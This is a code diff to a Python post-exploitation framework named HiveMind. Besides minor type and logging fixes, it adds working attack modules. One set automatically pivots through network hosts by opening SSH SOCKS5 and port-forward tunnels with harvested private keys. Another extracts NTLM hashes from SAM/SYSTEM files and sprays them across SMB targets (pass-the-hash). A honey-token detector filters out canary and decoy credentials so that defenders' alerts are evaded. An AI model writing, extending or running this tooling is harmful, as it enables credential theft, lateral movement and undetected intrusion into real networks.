@@ -27,6 +27,9 @@ from typing import Any
 
 logger = logging.getLogger(__name__)
 
+# Singleton instance
+_hive_mind: "HiveMind | None" = None
+
 
 # =============================================================================
 # CONSTANTS
@@ -177,12 +180,12 @@ class CredentialHarvester:
         except PermissionError:
             logger.debug("Permission denied reading SSH key: %s", key_path)
         except Exception as e:
-            logger.debug("Error reading SSH key {key_path}: %s", e)
+            logger.debug("Error reading SSH key %s: %s", key_path, e)
         return None
 
     def harvest_ssh_keys(self) -> list[Credential]:
         """Harvest SSH private keys from common locations."""
-        found = []
+        found: list[Credential] = []
         ssh_dir = Path.home() / ".ssh"
 
         if not ssh_dir.exists():
@@ -343,8 +346,8 @@ class CredentialHarvester:
                 for line in content.splitlines():
                     if line.strip().startswith("User "):
                         return line.split()[1]
-        except Exception:
-            pass
+        except (OSError, ValueError) as e:
+            logger.debug("SSH config read failed: %s", e)
         return os.getlogin() if hasattr(os, "getlogin") else "unknown"
 
     def get_all_credentials(self) -> list[Credential]:
@@ -382,7 +385,7 @@ class NetworkMapper:
         try:
             ips = socket.getaddrinfo(hostname, None, socket.AF_INET)
             for ip_info in ips:
-                ip = ip_info[4][0]
+                ip = str(ip_info[4][0])
                 if not ip.startswith("127."):
                     interfaces.append(ip)
         except socket.gaierror:
@@ -755,7 +758,7 @@ class ADAnalyzer:
                     vulnerable_users.append(user)
 
             except Exception as e:
-                logger.debug("Roasting check failed for {user}: %s", e)
+                logger.debug("Roasting check failed for %s: %s", user, e)
 
         return vulnerable_users
 
@@ -994,6 +997,438 @@ class LateralMover:
 
 
 # =============================================================================
+# AUTO-PIVOTING & TUNNEL MANAGEMENT
+# =============================================================================
+
+
+@dataclass
+class TunnelConfig:
+    """Configuration for a network tunnel."""
+
+    tunnel_type: str  # "socks5", "ssh_forward", "ssh_reverse"
+    local_port: int
+    remote_host: str
+    remote_port: int
+    jump_host: str
+    username: str
+    credential: Credential | None = None
+    active: bool = False
+    pid: int | None = None
+
+
+class TunnelManager:
+    """Manages network tunnels for pivoting.
+
+    Supports:
+    - SOCKS5 dynamic port forwarding via SSH
+    - Local port forwarding
+    - Reverse port forwarding
+    - Chisel-style tunnels
+
+    """
+
+    def __init__(self) -> None:
+        """Initialize tunnel manager."""
+        self.active_tunnels: dict[int, TunnelConfig] = {}
+        self._next_local_port = 9050
+
+    def _get_next_port(self) -> int:
+        """Get next available local port."""
+        port = self._next_local_port
+        self._next_local_port += 1
+        return port
+
+    def create_socks5_tunnel(
+        self,
+        jump_host: str,
+        username: str,
+        credential: Credential | None = None,
+        local_port: int | None = None,
+    ) -> TunnelConfig:
+        """Create SOCKS5 dynamic tunnel via SSH.
+
+        Args:
+            jump_host: Host to use as SOCKS proxy
+            username: SSH username
+            credential: SSH credential (key or password)
+            local_port: Local port for SOCKS proxy (auto-assigned if None)
+
+        Returns:
+            TunnelConfig with tunnel details
+
+        """
+        if local_port is None:
+            local_port = self._get_next_port()
+
+        config = TunnelConfig(
+            tunnel_type="socks5",
+            local_port=local_port,
+            remote_host=jump_host,
+            remote_port=22,
+            jump_host=jump_host,
+            username=username,
+            credential=credential,
+            active=False,
+        )
+
+        # Build SSH command for SOCKS5
+        cmd = self._build_ssh_tunnel_command(config)
+
+        try:
+            # Start tunnel in background
+            process = subprocess.Popen(
+                shlex.split(cmd),
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True,
+            )
+            config.pid = process.pid
+            config.active = True
+            self.active_tunnels[local_port] = config
+
+            logger.info(
+                "SOCKS5 tunnel created: localhost:%d -> %s",
+                local_port,
+                jump_host,
+            )
+
+        except Exception as e:
+            logger.exception("Failed to create SOCKS5 tunnel: %s", e)
+
+        return config
+
+    def _build_ssh_tunnel_command(self, config: TunnelConfig) -> str:
+        """Build SSH tunnel command."""
+        base_cmd = "ssh -N -f"
+
+        if config.tunnel_type == "socks5":
+            base_cmd += f" -D {config.local_port}"
+        elif config.tunnel_type == "ssh_forward":
+            base_cmd += (
+                f" -L {config.local_port}:{config.remote_host}:{config.remote_port}"
+            )
+        elif config.tunnel_type == "ssh_reverse":
+            base_cmd += (
+                f" -R {config.remote_port}:localhost:{config.local_port}"
+            )
+
+        # Add key if available
+        if config.credential and config.credential.credential_type == CredentialType.SSH_KEY:
+            key_path = config.credential.source
+            base_cmd += f" -i {key_path}"
+
+        base_cmd += f" {config.username}@{config.jump_host}"
+
+        return base_cmd
+
+    def create_port_forward(
+        self,
+        jump_host: str,
+        username: str,
+        remote_host: str,
+        remote_port: int,
+        local_port: int | None = None,
+        credential: Credential | None = None,
+    ) -> TunnelConfig:
+        """Create local port forward tunnel.
+
+        Args:
+            jump_host: SSH jump host
+            username: SSH username
+            remote_host: Target host (from jump_host perspective)
+            remote_port: Target port
+            local_port: Local port (auto-assigned if None)
+            credential: SSH credential
+
+        Returns:
+            TunnelConfig
+
+        """
+        if local_port is None:
+            local_port = self._get_next_port()
+
+        config = TunnelConfig(
+            tunnel_type="ssh_forward",
+            local_port=local_port,
+            remote_host=remote_host,
+            remote_port=remote_port,
+            jump_host=jump_host,
+            username=username,
+            credential=credential,
+            active=False,
+        )
+
+        cmd = self._build_ssh_tunnel_command(config)
+
+        try:
+            process = subprocess.Popen(
+                shlex.split(cmd),
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True,
+            )
+            config.pid = process.pid
+            config.active = True
+            self.active_tunnels[local_port] = config
+
+            logger.info(
+                "Port forward: localhost:%d -> %s:%d (via %s)",
+                local_port,
+                remote_host,
+                remote_port,
+                jump_host,
+            )
+
+        except Exception as e:
+            logger.exception("Failed to create port forward: %s", e)
+
+        return config
+
+    def close_tunnel(self, local_port: int) -> bool:
+        """Close a tunnel by local port.
+
+        Args:
+            local_port: Local port of tunnel to close
+
+        Returns:
+            True if closed successfully
+
+        """
+        if local_port not in self.active_tunnels:
+            return False
+
+        config = self.active_tunnels[local_port]
+
+        if config.pid:
+            try:
+                os.kill(config.pid, 15)  # SIGTERM
+                logger.info("Tunnel on port %d closed", local_port)
+            except OSError as e:
+                logger.debug("Error closing tunnel: %s", e)
+
+        config.active = False
+        del self.active_tunnels[local_port]
+        return True
+
+    def close_all_tunnels(self) -> int:
+        """Close all active tunnels.
+
+        Returns:
+            Number of tunnels closed
+
+        """
+        ports = list(self.active_tunnels.keys())
+        closed = 0
+        for port in ports:
+            if self.close_tunnel(port):
+                closed += 1
+        return closed
+
+    def get_proxy_config(self, local_port: int) -> dict[str, Any]:
+        """Get proxy configuration for a SOCKS5 tunnel.
+
+        Args:
+            local_port: Local SOCKS5 port
+
+        Returns:
+            Dict with proxy settings
+
+        """
+        if local_port not in self.active_tunnels:
+            return {}
+
+        config = self.active_tunnels[local_port]
+
+        if config.tunnel_type != "socks5":
+            return {}
+
+        return {
+            "http": f"socks5://127.0.0.1:{local_port}",
+            "https": f"socks5://127.0.0.1:{local_port}",
+            "all": f"socks5://127.0.0.1:{local_port}",
+        }
+
+    def list_tunnels(self) -> list[dict[str, Any]]:
+        """List all active tunnels.
+
+        Returns:
+            List of tunnel info dicts
+
+        """
+        return [
+            {
+                "local_port": port,
+                "type": config.tunnel_type,
+                "jump_host": config.jump_host,
+                "remote": f"{config.remote_host}:{config.remote_port}",
+                "active": config.active,
+            }
+            for port, config in self.active_tunnels.items()
+        ]
+
+
+class AutoPivot:
+    """Automatic pivot point detection and tunnel setup.
+
+    Uses HiveMind's network mapping to find pivot points,
+    then automatically establishes tunnels through them.
+
+    """
+
+    def __init__(
+        self,
+        mapper: "NetworkMapper",
+        harvester: "CredentialHarvester",
+    ) -> None:
+        """Initialize AutoPivot.
+
+        Args:
+            mapper: Network mapper for host discovery
+            harvester: Credential harvester for auth
+
+        """
+        self.mapper = mapper
+        self.harvester = harvester
+        self.tunnel_manager = TunnelManager()
+        self.pivot_chain: list[TunnelConfig] = []
+
+    def find_and_pivot(
+        self,
+        _target_subnet: str | None = None,
+    ) -> list[TunnelConfig]:
+        """Automatically find pivot points and establish tunnels.
+
+        Args:
+            _target_subnet: Target subnet to reach (reserved for future filtering)
+
+        Returns:
+            List of established tunnel configs
+
+        """
+        established: list[TunnelConfig] = []
+
+        # Find pivot points
+        pivots = self.mapper.find_pivot_points()
+
+        if not pivots:
+            logger.warning("No pivot points found")
+            return established
+
+        # Get SSH credentials
+        ssh_creds = [
+            c
+            for c in self.harvester.harvested
+            if c.credential_type == CredentialType.SSH_KEY
+        ]
+
+        for pivot in pivots:
+            if 22 not in pivot.ports:
+                continue
+
+            # Try each SSH credential
+            for cred in ssh_creds:
+                try:
+                    config = self.tunnel_manager.create_socks5_tunnel(
+                        jump_host=pivot.ip,
+                        username=cred.username,
+                        credential=cred,
+                    )
+
+                    if config.active:
+                        established.append(config)
+                        self.pivot_chain.append(config)
+                        logger.info(
+                            "Auto-pivot established through %s",
+                            pivot.ip,
+                        )
+                        break  # One tunnel per pivot is enough
+
+                except Exception as e:
+                    logger.debug("Auto-pivot failed for %s: %s", pivot.ip, e)
+
+        return established
+
+    def chain_pivot(
+        self,
+        targets: list[str],
+        username: str,
+        credential: Credential,
+    ) -> list[TunnelConfig]:
+        """Create chained tunnels through multiple hosts.
+
+        Args:
+            targets: List of hosts to chain through
+            username: SSH username
+            credential: SSH credential
+
+        Returns:
+            List of chained tunnel configs
+
+        """
+        chain: list[TunnelConfig] = []
+        current_port = 9050
+
+        for i, target in enumerate(targets):
+            if i == 0:
+                # First hop - direct connection
+                config = self.tunnel_manager.create_socks5_tunnel(
+                    jump_host=target,
+                    username=username,
+                    credential=credential,
+                    local_port=current_port,
+                )
+            else:
+                # Subsequent hops - tunnel through previous
+                # Use ProxyJump/ProxyCommand
+                config = self.tunnel_manager.create_socks5_tunnel(
+                    jump_host=target,
+                    username=username,
+                    credential=credential,
+                    local_port=current_port + i,
+                )
+
+            if config.active:
+                chain.append(config)
+                self.pivot_chain.append(config)
+            else:
+                logger.warning("Chain broken at %s", target)
+                break
+
+        return chain
+
+    def cleanup(self) -> int:
+        """Close all pivot tunnels.
+
+        Returns:
+            Number of tunnels closed
+
+        """
+        closed = self.tunnel_manager.close_all_tunnels()
+        self.pivot_chain.clear()
+        return closed
+
+    def get_status(self) -> dict[str, Any]:
+        """Get auto-pivot status.
+
+        Returns:
+            Status dict
+
+        """
+        return {
+            "tunnels_active": len(self.pivot_chain),
+            "pivot_chain": [
+                {
+                    "host": c.jump_host,
+                    "port": c.local_port,
+                    "type": c.tunnel_type,
+                }
+                for c in self.pivot_chain
+            ],
+            "all_tunnels": self.tunnel_manager.list_tunnels(),
+        }
+
+
+# =============================================================================
 # HIVE MIND - MAIN ORCHESTRATOR
 # =============================================================================
 
@@ -1021,6 +1456,7 @@ class HiveMind:
         self.mapper = NetworkMapper()
         self.ad_analyzer = ADAnalyzer()
         self.mover = LateralMover()
+        self.auto_pivot = AutoPivot(self.mapper, self.harvester)
 
         self.current_host: str | None = None
         self.initialized: bool = False
@@ -1034,7 +1470,7 @@ class HiveMind:
             Dict with initialization results
 
         """
-        results = {
+        results: dict[str, Any] = {
             "interfaces": [],
             "domain": None,
             "credentials_found": 0,
@@ -1044,9 +1480,10 @@ class HiveMind:
 
         try:
             # Get local network info
-            results["interfaces"] = self.mapper.get_local_interfaces()
-            if results["interfaces"]:
-                self.current_host = results["interfaces"][0]
+            interfaces = self.mapper.get_local_interfaces()
+            results["interfaces"] = interfaces
+            if interfaces:
+                self.current_host = interfaces[0]
 
             # Check for domain
             results["domain"] = self.ad_analyzer.detect_domain()
@@ -1062,7 +1499,8 @@ class HiveMind:
             self.initialized = True
 
         except Exception as e:
-            results["errors"].append(str(e))
+            if isinstance(results.get("errors"), list):
+                results["errors"].append(str(e))
             logger.exception("Initialization error: %s", e)
 
         return results
@@ -1107,7 +1545,7 @@ class HiveMind:
             List of possible attack paths
 
         """
-        paths = []
+        paths: list[AttackPath] = []
 
         if not self.current_host:
             return paths
@@ -1202,7 +1640,117 @@ class HiveMind:
             if self.ad_analyzer.domain_info
             else None,
             "movement_stats": self.mover.get_movement_stats(),
+            "pivot_status": self.auto_pivot.get_status(),
         }
+
+    def setup_auto_pivot(
+        self,
+        target_subnet: str | None = None,
+    ) -> dict[str, Any]:
+        """Automatically find and pivot through suitable hosts.
+
+        Args:
+            target_subnet: Optional target subnet to reach
+
+        Returns:
+            Dict with pivot results
+
+        """
+        result = {
+            "success": False,
+            "tunnels_created": 0,
+            "pivot_points": [],
+            "proxy_config": {},
+        }
+
+        # Find pivot points and establish tunnels
+        tunnels = self.auto_pivot.find_and_pivot(target_subnet)
+
+        if tunnels:
+            result["success"] = True
+            result["tunnels_created"] = len(tunnels)
+            result["pivot_points"] = [t.jump_host for t in tunnels]
+
+            # Get proxy config for first tunnel
+            if tunnels:
+                result["proxy_config"] = self.auto_pivot.tunnel_manager.get_proxy_config(
+                    tunnels[0].local_port
+                )
+
+        return result
+
+    def create_tunnel(
+        self,
+        jump_host: str,
+        username: str,
+        tunnel_type: str = "socks5",
+        remote_host: str | None = None,
+        remote_port: int | None = None,
+    ) -> dict[str, Any]:
+        """Create a specific tunnel.
+
+        Args:
+            jump_host: Host to tunnel through
+            username: SSH username
+            tunnel_type: "socks5" or "forward"
+            remote_host: Target host (for forward tunnels)
+            remote_port: Target port (for forward tunnels)
+
+        Returns:
+            Tunnel config dict
+
+        """
+        # Find SSH credential for this user
+        credential = None
+        for cred in self.harvester.harvested:
+            if (
+                cred.credential_type == CredentialType.SSH_KEY
+                and cred.username == username
+            ):
+                credential = cred
+                break
+
+        if tunnel_type == "socks5":
+            config = self.auto_pivot.tunnel_manager.create_socks5_tunnel(
+                jump_host=jump_host,
+                username=username,
+                credential=credential,
+            )
+        elif tunnel_type == "forward" and remote_host and remote_port:
+            config = self.auto_pivot.tunnel_manager.create_port_forward(
+                jump_host=jump_host,
+                username=username,
+                remote_host=remote_host,
+                remote_port=remote_port,
+                credential=credential,
+            )
+        else:
+            return {"success": False, "error": "Invalid tunnel configuration"}
+
+        return {
+            "success": config.active,
+            "local_port": config.local_port,
+            "jump_host": config.jump_host,
+            "tunnel_type": config.tunnel_type,
+        }
+
+    def list_tunnels(self) -> list[dict[str, Any]]:
+        """List all active tunnels.
+
+        Returns:
+            List of tunnel info dicts
+
+        """
+        return self.auto_pivot.tunnel_manager.list_tunnels()
+
+    def close_tunnels(self) -> int:
+        """Close all tunnels.
+
+        Returns:
+            Number of tunnels closed
+
+        """
+        return self.auto_pivot.cleanup()
 
 
 # =============================================================================
@@ -1215,10 +1763,9 @@ def get_hive_mind() -> HiveMind:
 
     Returns:
         HiveMind instance
-
     """
     global _hive_mind
-    if "_hive_mind" not in globals() or _hive_mind is None:
+    if _hive_mind is None:
         _hive_mind = HiveMind()
     return _hive_mind
 
@@ -1232,3 +1779,377 @@ def quick_recon() -> dict[str, Any]:
     """
     hive = get_hive_mind()
     return hive.initialize()
+
+
+# =============================================================================
+# PASS-THE-HASH AUTOMATION
+# =============================================================================
+
+
+class PassTheHashAutomation:
+    """Automate Pass-the-Hash attacks for lateral movement.
+
+    Features:
+    - NTLM hash extraction (from memory or files)
+    - Hash spray across network
+    - Automatic session establishment
+    - Credential reuse chain building
+    """
+
+    def __init__(self) -> None:
+        self.harvested_hashes: list[Credential] = []
+        self.successful_auths: list[dict[str, Any]] = []
+        self._impacket_available = self._check_impacket()
+
+    def _check_impacket(self) -> bool:
+        """Check if Impacket tools are available."""
+        try:
+            import shutil
+            return shutil.which("impacket-smbclient") is not None or \
+                   shutil.which("smbclient.py") is not None
+        except Exception:
+            return False
+
+    def _parse_secretsdump_line(self, line: str) -> Credential | None:
+        """Parse a single line from secretsdump output.
+
+        Args:
+            line: Output line in format username:rid:lm:nt:::
+
+        Returns:
+            Credential object or None if parsing fails
+        """
+        if ":::" not in line:
+            return None
+
+        parts = line.split(":")
+        if len(parts) < 4:
+            return None
+
+        username = parts[0]
+        ntlm_hash = parts[3] if len(parts[3]) == 32 else parts[2]
+
+        return Credential(
+            username=username,
+            domain="LOCAL",
+            credential_type=CredentialType.NTLM_HASH,
+            value=ntlm_hash,
+            source="SAM",
+        )
+
+    def extract_hashes_from_sam(self, sam_path: str, system_path: str) -> list[Credential]:
+        """Extract NTLM hashes from SAM/SYSTEM files.
+
+        Args:
+            sam_path: Path to SAM file
+            system_path: Path to SYSTEM file
+
+        Returns:
+            List of extracted credentials with NTLM hashes
+        """
+        hashes = []
+        try:
+            # Use secretsdump if available
+            import subprocess
+            result = subprocess.run(
+                ["impacket-secretsdump", "-sam", sam_path, "-system", system_path, "LOCAL"],
+                capture_output=True,
+                text=True,
+                timeout=60,
+            )
+            if result.returncode == 0:
+                for line in result.stdout.splitlines():
+                    cred = self._parse_secretsdump_line(line)
+                    if cred:
+                        hashes.append(cred)
+                        self.harvested_hashes.append(cred)
+        except Exception as e:
+            logger.debug("SAM extraction failed: %s", e)
+
+        return hashes
+
+    def pth_smb(self, target: str, username: str, ntlm_hash: str, domain: str = "") -> dict[str, Any]:
+        """Perform Pass-the-Hash via SMB.
+
+        Args:
+            target: Target IP or hostname
+            username: Username to authenticate as
+            ntlm_hash: NTLM hash (LM:NT format or just NT)
+            domain: Domain (optional)
+
+        Returns:
+            Dict with success status and session info
+        """
+        if not self._impacket_available:
+            return {"success": False, "error": "Impacket not available"}
+
+        try:
+            import subprocess
+            # Format: DOMAIN/user@target -hashes LM:NT
+            lm_hash = "aad3b435b51404eeaad3b435b51404ee"  # Empty LM
+            nt_hash = ntlm_hash if len(ntlm_hash) == 32 else ntlm_hash.split(":")[-1]
+
+            cmd = [
+                "impacket-smbclient",
+                f"{domain}/{username}@{target}" if domain else f"{username}@{target}",
+                "-hashes", f"{lm_hash}:{nt_hash}",
+                "-c", "shares",
+            ]
+
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+
+            if result.returncode == 0 and "ACCESS_DENIED" not in result.stdout:
+                auth_result = {
+                    "success": True,
+                    "target": target,
+                    "username": username,
+                    "domain": domain,
+                    "technique": "PTH-SMB",
+                    "shares": self._parse_shares(result.stdout),
+                }
+                self.successful_auths.append(auth_result)
+                logger.info("PTH success: %s@%s", username, target)
+                return auth_result
+
+            return {"success": False, "error": "Authentication failed"}
+
+        except subprocess.TimeoutExpired:
+            return {"success": False, "error": "Timeout"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    def _parse_shares(self, output: str) -> list[str]:
+        """Parse SMB shares from output."""
+        shares = []
+        for line in output.splitlines():
+            if "$" in line or "Disk" in line:
+                parts = line.split()
+                if parts:
+                    shares.append(parts[0])
+        return shares
+
+    def spray_hash(
+        self,
+        targets: list[str],
+        username: str,
+        ntlm_hash: str,
+        domain: str = "",
+    ) -> list[dict[str, Any]]:
+        """Spray a single hash across multiple targets.
+
+        Args:
+            targets: List of target IPs/hostnames
+            username: Username to authenticate as
+            ntlm_hash: NTLM hash
+            domain: Domain (optional)
+
+        Returns:
+            List of successful authentication results
+        """
+        successes = []
+        for target in targets:
+            result = self.pth_smb(target, username, ntlm_hash, domain)
+            if result.get("success"):
+                successes.append(result)
+                logger.info("Hash spray success: %s -> %s", username, target)
+
+        return successes
+
+    def build_credential_chain(self) -> list[dict[str, Any]]:
+        """Build a chain of credential reuse opportunities.
+
+        Returns:
+            List of credential reuse paths
+        """
+        chain = []
+        for auth in self.successful_auths:
+            chain.append({
+                "from": auth.get("source", "initial"),
+                "to": auth["target"],
+                "via": auth["username"],
+                "technique": auth.get("technique", "PTH"),
+            })
+        return chain
+
+
+# =============================================================================
+# HONEY-TOKEN DETECTION
+# =============================================================================
+
+
+class HoneyTokenDetector:
+    """Detect honey tokens, canary files, and decoy credentials.
+
+    Features:
+    - Detect fake credentials designed to trigger alerts
+    - Identify canary files and tokens
+    - Pattern-based detection
+    - Behavioral analysis
+    """
+
+    # Known honey token patterns
+    HONEY_PATTERNS = [
+        r"honey",
+        r"canary",
+        r"decoy",
+        r"trap",
+        r"fake",
+        r"test.*admin",
+        r"admin.*test",
+        r"thinkst",  # Thinkst Canary
+        r"canarytokens",
+    ]
+
+    # Suspicious file patterns
+    CANARY_FILE_PATTERNS = [
+        "passwords.txt",
+        "credentials.txt",
+        "secrets.txt",
+        "admin_passwords.xlsx",
+        "database_backup.sql",
+        "private_keys.zip",
+        "bitcoin_wallet.dat",
+    ]
+
+    def __init__(self) -> None:
+        self.detected_tokens: list[dict[str, Any]] = []
+        self._compiled_patterns = [re.compile(p, re.IGNORECASE) for p in self.HONEY_PATTERNS]
+
+    def is_honey_credential(self, credential: Credential) -> bool:
+        """Check if a credential appears to be a honey token.
+
+        Args:
+            credential: Credential to check
+
+        Returns:
+            True if credential appears to be a honey token
+        """
+        # Check username against patterns
+        for pattern in self._compiled_patterns:
+            if pattern.search(credential.username):
+                self._record_detection("credential", credential.username, "pattern_match")
+                return True
+
+        # Check for suspiciously simple passwords
+        if credential.credential_type == CredentialType.PASSWORD:
+            suspicious_passwords = [
+                "password", "password123", "admin123", "letmein",
+                "welcome1", "changeme", "secret123",
+            ]
+            if credential.value.lower() in suspicious_passwords:
+                self._record_detection("credential", credential.username, "common_password")
+                return True
+
+        # Check source for suspicious patterns
+        for pattern in self._compiled_patterns:
+            if pattern.search(credential.source):
+                self._record_detection("credential", credential.username, "source_pattern")
+                return True
+
+        return False
+
+    def is_canary_file(self, filepath: str) -> bool:
+        """Check if a file appears to be a canary file.
+
+        Args:
+            filepath: Path to check
+
+        Returns:
+            True if file appears to be a canary
+        """
+        filename = os.path.basename(filepath).lower()
+
+        # Check against known canary filenames
+        for canary_name in self.CANARY_FILE_PATTERNS:
+            if canary_name.lower() in filename:
+                self._record_detection("file", filepath, "canary_filename")
+                return True
+
+        # Check for suspicious metadata
+        try:
+            stat = os.stat(filepath)
+            # Files that are too convenient (recently modified, easily accessible)
+            # could be honey files
+            if stat.st_size == 0:
+                self._record_detection("file", filepath, "empty_file")
+                return True
+        except OSError:
+            pass
+
+        return False
+
+    def check_ad_object(self, object_name: str, properties: dict[str, Any]) -> bool:
+        """Check if an AD object might be a honey object.
+
+        Args:
+            object_name: Name of the AD object
+            properties: Object properties
+
+        Returns:
+            True if object appears to be a honey object
+        """
+        # Check name patterns
+        for pattern in self._compiled_patterns:
+            if pattern.search(object_name):
+                self._record_detection("ad_object", object_name, "pattern_match")
+                return True
+
+        # Check for suspicious properties
+        description = properties.get("description", "")
+        if any(word in description.lower() for word in ["honeypot", "decoy", "test"]):
+            self._record_detection("ad_object", object_name, "description_match")
+            return True
+
+        # Check for unusual adminCount
+        if properties.get("adminCount") == 1 and "admin" not in object_name.lower():
+            self._record_detection("ad_object", object_name, "suspicious_admincount")
+            return True
+
+        return False
+
+    def _record_detection(self, token_type: str, identifier: str, reason: str) -> None:
+        """Record a detected honey token."""
+        detection = {
+            "type": token_type,
+            "identifier": identifier,
+            "reason": reason,
+            "timestamp": __import__("time").time(),
+        }
+        self.detected_tokens.append(detection)
+        logger.warning("Honey token detected: %s (%s) - %s", identifier, token_type, reason)
+
+    def get_detections(self) -> list[dict[str, Any]]:
+        """Get all detected honey tokens.
+
+        Returns:
+            List of detection records
+        """
+        return self.detected_tokens
+
+    def filter_safe_credentials(self, credentials: list[Credential]) -> list[Credential]:
+        """Filter out potential honey credentials.
+
+        Args:
+            credentials: List of credentials to filter
+
+        Returns:
+            Filtered list with honey credentials removed
+        """
+        return [c for c in credentials if not self.is_honey_credential(c)]
+
+
+# =============================================================================
+# ENHANCED HIVE MIND INTEGRATION
+# =============================================================================
+
+
+# Add PTH and Honey Detection to HiveMind
+def enhance_hive_mind(hive: HiveMind) -> None:
+    """Enhance HiveMind with PTH automation and honey detection.
+
+    Args:
+        hive: HiveMind instance to enhance
+    """
+    hive.pth = PassTheHashAutomation()
+    hive.honey_detector = HoneyTokenDetector()
+    logger.info("HiveMind enhanced with PTH automation and honey detection")
